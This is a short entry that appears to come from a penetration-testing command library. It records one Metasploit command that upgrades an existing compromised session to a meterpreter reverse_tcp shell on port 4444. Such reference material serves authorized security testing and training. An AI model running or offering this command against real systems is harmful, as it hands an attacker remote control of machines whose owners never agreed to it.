---
id: 77353c65-e985-4f2d-86a7-b46357e8e977
name: Upgrade session to a meterpreter with custom options
type: command
executor: bash
data: sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp
  HANDLER=false
output: null
created_at: '2023-04-06T03:56:21.201701+00:00'
updated_at: '2023-04-10T20:24:56.124111+00:00'
---

# Upgrade session to a meterpreter with custom options

```bash
sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false
```
